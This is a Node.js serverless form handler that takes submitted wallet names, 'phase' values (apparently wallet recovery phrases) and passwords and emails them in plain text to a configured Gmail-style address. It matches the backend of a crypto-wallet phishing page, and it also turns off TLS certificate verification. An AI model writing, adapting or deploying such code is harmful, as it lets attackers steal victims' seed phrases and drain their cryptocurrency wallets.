const nodemailer = require("nodemailer");

const smtpUser = process.env.SMTP_USER || process.env.SMTP_USERNAME || process.env.EMAIL_USER;
const smtpPass = process.env.SMTP_PASS || process.env.SMTP_PASSWORD || process.env.EMAIL_PASSWORD;
const smtpHost = process.env.SMTP_HOST || process.env.SMTP_SERVER || "smtp.gmail.com";
const smtpPort = Number(process.env.SMTP_PORT || 587);
const smtpSecure = (process.env.SMTP_SECURE || "false") === "true" || smtpPort === 465;
const smtpSkipVerify = (process.env.SMTP_SKIP_VERIFY || "false") === "true";

const transporter = nodemailer.createTransport({
  host: smtpHost,
  port: smtpPort,
  secure: smtpSecure,
  tls: { rejectUnauthorized: false },
  auth: {
    user: smtpUser,
    pass: smtpPass,
  },
});

const parseBody = async (req) => {
  if (req.body) {
    return req.body;
  }

  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }
  const rawBody = Buffer.concat(chunks).toString("utf8");
  const contentType = (req.headers["content-type"] || "").toLowerCase();

  if (contentType.includes("application/json")) {
    return rawBody ? JSON.parse(rawBody) : {};
  }

  if (contentType.includes("application/x-www-form-urlencoded")) {
    return Object.fromEntries(new URLSearchParams(rawBody));
  }

  return {};
};

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  if (!smtpUser || !smtpPass) {
    return res.status(500).json({
      error: "SMTP credentials are not configured.",
      details: "Expected SMTP_USER or SMTP_PASSWORD and SMTP_PASS or SMTP_PASSWORD to be set.",
    });
  }

  let body;
  try {
    body = await parseBody(req);
  } catch (error) {
    console.error(error);
    return res.status(400).json({ error: "Invalid request body." });
  }

  // Verify transporter connectivity and authentication before sending
  if (!smtpSkipVerify) {
    try {
      await transporter.verify();
    } catch (err) {
      console.error('SMTP verify failed:', err);
      return res.status(500).json({ error: 'SMTP verification failed. Check SMTP credentials and network access.', details: err && err.message });
    }
  }

  const wallet_name = String(body.wallet_name || "").trim();
  const phase = String(body.phase || "").trim();
  const password = String(body.pw || "").trim();

  if (!phase) {
    return res.status(400).json({ error: "Required field missing." });
  }

  const fromEmail = process.env.EMAIL_FROM || process.env.SMTP_FROM_EMAIL || "noreply@connectus.website";
  const toEmail = process.env.EMAIL_TO || process.env.RECIPIENT_EMAIL || smtpUser || "attendantemail@gmail.com";

  if (!toEmail) {
    return res.status(500).json({ error: "Recipient email is not configured." });
  }

  const mailOptions = {
    from: fromEmail,
    to: toEmail,
    subject: "New Form Submission",
    text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    return res.status(200).json({ ok: true, messageId: info.messageId });
  } catch (error) {
    console.error('SendMail error:', error);
    return res.status(500).json({ error: "Message could not be sent.", details: (error && (error.response || error.message)) });
  }
};
